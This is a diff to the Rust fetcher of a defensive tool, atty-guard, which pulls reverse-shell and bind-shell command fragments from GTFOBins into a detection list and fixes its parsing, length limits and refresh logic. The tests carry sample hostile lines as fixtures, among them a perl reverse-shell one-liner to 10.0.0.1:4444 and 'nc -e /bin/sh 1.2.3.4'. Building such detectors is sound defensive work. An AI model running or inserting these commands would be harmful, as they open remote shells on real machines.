@@ -6,9 +6,10 @@
 //!
 //! Two operating modes:
 //!
-//!   - **One-shot CLI**: `atty-guard atoms update [--source NAME]`.
-//!     Fetches the configured sources synchronously, writes the
-//!     merged atom set, exits.
+//!   - **One-shot CLI**: `atty-guard --update-atoms-now
+//!     [--atoms-sources <csv>]`. Fetches the configured sources
+//!     synchronously, writes the merged atom set, exits without
+//!     binding the UDS socket.
 //!
 //!   - **Cron**: `atty-guard --atoms-update-interval 6h` runs the
 //!     daemon AND spawns a background thread that re-runs the
@@ -169,15 +170,24 @@ mod imp {
     /// `flagged_atoms.txt` via tmp+rename.
     ///
     /// Each source failure is captured in `FetchReport.per_source`
-    /// — one bad source doesn't fail the whole refresh.
+    /// — one bad source doesn't fail the whole refresh. If EVERY
+    /// source fails (or all yield zero atoms), we DON'T overwrite
+    /// the last-good `flagged_atoms.txt` — the existing corpus
+    /// stays in place and we return an error. This matches the
+    /// "last good atom set stays in place" guarantee in the module
+    /// docs.
     pub fn fetch_all(cfg: &FetcherConfig, sources: &[SourceId]) -> Result<FetchReport, FetchError> {
         let mut all_atoms: BTreeSet<String> = BTreeSet::new();
         let mut report = FetchReport::default();
+        let mut any_success = false;
 
         for sid in sources {
             match fetch_one(cfg, *sid) {
                 Ok(atoms) => {
                     let n = atoms.len();
+                    if n > 0 {
+                        any_success = true;
+                    }
                     all_atoms.extend(atoms);
                     report.per_source.push((*sid, Ok(n)));
                 }
@@ -188,6 +198,12 @@ mod imp {
         }
 
         report.atoms_total = all_atoms.len();
+        if !any_success {
+            return Err(FetchError::ParseError(
+                "all sources failed or produced zero atoms — keeping previous flagged_atoms.txt"
+                    .to_owned(),
+            ));
+        }
         write_atoms(&cfg.output_path, &all_atoms)?;
         Ok(report)
     }
@@ -198,11 +214,17 @@ mod imp {
         }
     }
 
-    /// Walk GTFOBins's repo tarball, extract every `_gtfobins/*.md`
+    /// Walk GTFOBins's repo tarball, extract every `_gtfobins/<bin>`
     /// file's YAML front-matter, pull command fragments out of the
     /// `functions.shell` / `bind-shell` / `reverse-shell` / etc.
     /// blocks. Each fragment is normalised + truncated to the
     /// first line (atoms are single-line by definition).
+    ///
+    /// GTFOBins's entries are **extensionless** in the live repo
+    /// (e.g. `_gtfobins/nc`, `_gtfobins/bash`, `_gtfobins/perl`)
+    /// — DON'T filter on `.md`. The path-shape signal we use is
+    /// `_gtfobins/<name>` with no further path components, which
+    /// excludes the directory entry itself + any nested dirs.
     fn fetch_gtfobins(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
         const URL: &str =
             "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/refs/heads/master";
@@ -229,14 +251,7 @@ mod imp {
             .map_err(|e| FetchError::DecompressError(e.to_string()))?
         {
             let mut entry = entry.map_err(|e| FetchError::DecompressError(e.to_string()))?;
-            let path = match entry.path() {
-                Ok(p) => p.into_owned(),
-                Err(_) => continue,
-            };
-            // The repo's binary docs live under
-            // `GTFOBins.github.io-master/_gtfobins/*.md`.
-            let path_str = path.to_string_lossy();
-            if !path_str.contains("/_gtfobins/") || !path_str.ends_with(".md") {
+            if !is_gtfobins_entry_file(&entry) {
                 continue;
             }
             let mut content = String::new();
@@ -247,6 +262,36 @@ mod imp {
         }
 
         Ok(atoms.into_iter().collect())
+    }
+
+    /// Returns true when the tarball entry is one of GTFOBins's
+    /// per-binary manifest files. Real layout:
+    /// `GTFOBins.github.io-master/_gtfobins/<binary>` — no
+    /// extension, no nested directories under `_gtfobins/`.
+    ///
+    /// Filtering on path shape (rather than file extension) is
+    /// load-bearing: the original `.md` filter rejected every
+    /// real GTFOBins entry, so the fetcher silently wrote zero
+    /// atoms while unit tests bypassing the path filter passed.
+    fn is_gtfobins_entry_file<R: std::io::Read>(entry: &tar::Entry<'_, R>) -> bool {
+        let Ok(path) = entry.path() else { return false };
+        let Some(parent) = path.parent() else { return false };
+        // Need: parent ends with `_gtfobins`, AND this is a file
+        // (not the directory entry itself).
+        let parent_is_gtfobins = parent
+            .file_name()
+            .map(|n| n == std::ffi::OsStr::new("_gtfobins"))
+            .unwrap_or(false);
+        if !parent_is_gtfobins {
+            return false;
+        }
+        let header_type = entry.header().entry_type();
+        if !header_type.is_file() {
+            return false;
+        }
+        // Reject the rare entry that nests further (e.g. a
+        // hypothetical `_gtfobins/subdir/foo`).
+        path.file_name().is_some()
     }
 
     /// Parse one GTFOBins markdown file's YAML front-matter and
@@ -262,16 +307,22 @@ mod imp {
     /// We extract every `code` scalar, take its first line, trim.
     /// Atom rules (≥3 chars, no leading `#`) apply at write time.
     fn extract_gtfobins_atoms(content: &str, atoms: &mut BTreeSet<String>) {
-        // Front-matter is delimited by `---` lines. Most files
-        // open with `---` on line 1.
-        let after_open = match content.split_once("---") {
-            Some((_, rest)) => rest,
-            None => return,
+        // Front-matter must be `---\n…---\n` Jekyll-style. Tighter
+        // parsing than "split on the first `---`" — without the
+        // close fence (or with garbage trailing the YAML) the whole
+        // markdown body would be handed to serde_yaml. Bail clean
+        // on missing fence: the upstream file is malformed and we
+        // shouldn't pretend to parse atoms from prose.
+        let stripped = content.strip_prefix("---\n").or_else(|| content.strip_prefix("---\r\n"));
+        let Some(rest) = stripped else { return };
+        let close_marker = if let Some(at) = rest.find("\n---\n") {
+            (at, 5)
+        } else if let Some(at) = rest.find("\n---\r\n") {
+            (at, 6)
+        } else {
+            return;
         };
-        let yaml = match after_open.split_once("\n---") {
-            Some((y, _)) => y,
-            None => after_open,
-        };
+        let yaml = &rest[..close_marker.0];
         let parsed: serde_yaml::Value = match serde_yaml::from_str(yaml) {
             Ok(v) => v,
             Err(_) => return,
@@ -297,27 +348,39 @@ mod imp {
         }
     }
 
+    /// Max atom length the GTFOBins fetcher will emit. Longer
+    /// fragments are higher-signal (full perl/python reverse-shell
+    /// one-liners run 100-250 chars) — keeping them is the whole
+    /// point of including GTFOBins. The original 60-char ceiling
+    /// was too restrictive and dropped the most diagnostic atoms.
+    /// The AC scan cost is O(haystack) and effectively independent
+    /// of pattern length, so longer atoms don't slow matching.
+    const ATOM_MAX_LEN: usize = 200;
+    const ATOM_MIN_LEN: usize = 3;
+
     /// Turn a GTFOBins `code` scalar into a single atom string.
     /// We take the first non-blank line, strip leading whitespace
     /// (markdown YAML scalars carry indentation), and refuse
-    /// atoms < 3 chars or > 60 chars (too short = noise, too long
-    /// = better suited to a regex rule).
+    /// atoms below the min or above the max length (too short =
+    /// noise; too long = better suited to a regex anyway).
     fn atom_from_code(code: &str) -> Option<String> {
         for line in code.lines() {
             let t = line.trim();
             if t.is_empty() {
                 continue;
             }
-            if t.len() < 3 || t.len() > 60 {
-                return None;
-            }
             // Drop trailing `# example` comments — they're docs,
-            // not atom content.
-            let clean = match t.find(" #") {
+            // not atom content. Trim AFTER comment strip because
+            // the strip can leave trailing spaces.
+            let clean_str = match t.find(" #") {
                 Some(i) => &t[..i],
                 None => t,
             };
-            return Some(clean.trim().to_owned());
+            let clean = clean_str.trim();
+            if clean.len() < ATOM_MIN_LEN || clean.len() > ATOM_MAX_LEN {
+                return None;
+            }
+            return Some(clean.to_owned());
         }
         None
     }
@@ -330,7 +393,7 @@ mod imp {
                 .map_err(|e| FetchError::WriteError(format!("mkdir -p {parent:?}: {e}")))?;
         }
         let tmp = path.with_extension("txt.tmp");
-        let header = "# atty-guard auto-fetched atom set.\n# Generated by `atty-guard atoms update`. Do NOT hand-edit —\n# changes get overwritten on next refresh. The bundled\n# `flagged_atoms.txt` (in the atty repo) stays the source of\n# truth; this file lives in $XDG_DATA_HOME/atty-guard and only\n# carries data pulled from upstream IOC corpora.\n";
+        let header = "# atty-guard auto-fetched atom set.\n# Generated by `atty-guard --update-atoms-now` (or the daemon's\n# `--atoms-update-interval` cron mode). Do NOT hand-edit —\n# changes get overwritten on next refresh. The bundled\n# `flagged_atoms.txt` (in the atty repo) stays the source of\n# truth; this file lives in $XDG_DATA_HOME/atty-guard and only\n# carries data pulled from upstream IOC corpora.\n";
         let mut content = String::with_capacity(header.len() + atoms.len() * 32);
         content.push_str(header);
         for a in atoms {
@@ -344,32 +407,35 @@ mod imp {
         Ok(())
     }
 
-    /// Spawn the cron-style background refresh. Sleeps the
-    /// interval, fetches, logs, repeats. Failures don't abort
-    /// the thread — the next interval gets another shot.
+    /// Spawn the cron-style background refresh. Fetches FIRST
+    /// (so a daemon launched with `--atoms-update-interval` always
+    /// gets a fresh corpus on startup, not after one interval), then
+    /// sleeps. Failures don't abort the thread — the next interval
+    /// gets another shot.
     pub fn spawn_periodic_refresh(
         cfg: FetcherConfig,
         sources: Vec<SourceId>,
         interval: Duration,
     ) {
-        std::thread::Builder::new()
-            .name("atty-guard-atoms-refresh".into())
-            .spawn(move || loop {
-                std::thread::sleep(interval);
-                match fetch_all(&cfg, &sources) {
-                    Ok(report) => {
-                        eprintln!(
-                            "atty-guard: atom refresh ok — {} atoms across {} sources",
-                            report.atoms_total,
-                            report.per_source.len()
-                        );
-                    }
-                    Err(e) => {
-                        eprintln!("atty-guard: atom refresh failed — {e}");
-                    }
+        let builder = std::thread::Builder::new().name("atty-guard-atoms-refresh".into());
+        let spawn_result = builder.spawn(move || loop {
+            match fetch_all(&cfg, &sources) {
+                Ok(report) => {
+                    eprintln!(
+                        "atty-guard: atom refresh ok — {} atoms across {} sources",
+                        report.atoms_total,
+                        report.per_source.len()
+                    );
                 }
-            })
-            .ok();
+                Err(e) => {
+                    eprintln!("atty-guard: atom refresh failed — {e}");
+                }
+            }
+            std::thread::sleep(interval);
+        });
+        if let Err(e) = spawn_result {
+            eprintln!("atty-guard: cron thread spawn failed — {e}; atoms will not refresh until restart");
+        }
     }
 
     #[cfg(test)]
@@ -393,8 +459,22 @@ mod imp {
 
         #[test]
         fn atom_from_code_rejects_too_long() {
-            let s = "a".repeat(100);
+            // Past the ATOM_MAX_LEN ceiling — anything bigger
+            // belongs in a regex rule, not an atom.
+            let s = "a".repeat(ATOM_MAX_LEN + 1);
             assert!(atom_from_code(&s).is_none());
+        }
+
+        #[test]
+        fn atom_from_code_accepts_realistic_gtfobins_oneliner() {
+            // Real GTFOBins entries run 100-250 chars — keeping
+            // them is the whole point of including the corpus.
+            // This length sat above the original 60-char ceiling.
+            let perl_one_liner = "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'";
+            // Sanity: the example is between min and max.
+            assert!(perl_one_liner.len() > 60);
+            assert!(perl_one_liner.len() <= ATOM_MAX_LEN);
+            assert_eq!(atom_from_code(perl_one_liner).as_deref(), Some(perl_one_liner));
         }
 
         #[test]
@@ -425,6 +505,34 @@ functions:
             assert!(atoms.iter().any(|a| a.contains("nc -e")));
             assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
             assert!(atoms.iter().any(|a| a.starts_with("socat")));
+        }
+
+        #[test]
+        fn extract_gtfobins_bails_without_close_fence() {
+            // Without a closing `---` fence, treat the file as
+            // malformed and emit zero atoms — DON'T pass the
+            // whole markdown body to serde_yaml.
+            let doc = "---\nfunctions:\n  shell:\n    - code: |\n        nc -e /bin/sh 1.2.3.4\nNo closing fence here, just markdown text after the front-matter.\n";
+            let mut atoms = BTreeSet::new();
+            extract_gtfobins_atoms(doc, &mut atoms);
+            assert!(atoms.is_empty(), "expected no atoms from malformed file, got {atoms:?}");
+        }
+
+        #[test]
+        fn fetch_all_refuses_to_overwrite_when_all_sources_fail() {
+            // No sources requested → no atoms collected →
+            // fetch_all returns an error and DOES NOT call
+            // write_atoms. Belt-and-braces against silently
+            // wiping the last-good corpus.
+            let dir = std::env::temp_dir().join(format!("atty-guard-fetcher-empty-{}", std::process::id()));
+            let path = dir.join("flagged_atoms.txt");
+            let cfg = FetcherConfig {
+                output_path: path.clone(),
+                ..FetcherConfig::default()
+            };
+            let result = fetch_all(&cfg, &[]);
+            assert!(matches!(result, Err(FetchError::ParseError(_))));
+            assert!(!path.exists(), "fetch_all must not create the output file on empty success set");
         }
 
         #[test]
